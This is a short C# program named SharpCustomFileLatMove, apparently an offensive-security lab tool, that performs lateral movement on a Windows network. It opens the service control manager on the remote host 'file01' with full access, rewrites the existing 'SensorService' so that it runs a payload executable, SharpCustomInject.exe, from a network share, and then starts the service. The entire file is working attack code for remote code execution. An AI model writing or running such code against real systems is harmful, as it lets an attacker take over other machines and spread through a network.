using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace SharpCustomFileLatMove
{
    public class Program
    { 
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern IntPtr OpenSCManager(
            string machineName, 
            string databaseName, 
            uint dwAccess);

        [DllImport("advapi32.dll", EntryPoint = "OpenServiceA", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr OpenService(
            IntPtr hSCManager, 
            string lpServiceName, 
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService, 
            uint dwServiceType,
            int dwStartType, 
            int dwErrorControl, 
            string lpBinaryPathName, 
            string lpLoadOrderGroup,
            string lpdwTagId, 
            string lpDependencies, 
            string lpServiceStartName, 
            string lpPassword,
            string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors
            );

        public static void Main(string[] args)
        {
            String target = "file01";
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            string ServiceName = "SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string payload = "\\\file01\\attachments\\SharpCustomInject.exe";
            bool blResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            Console.WriteLine("[*] Status of changing service: " + blResult.ToString());

            blResult = StartService(schService, 0, null);
            Console.WriteLine("[*] Status of starting service: " + blResult.ToString());
        }
    }
}
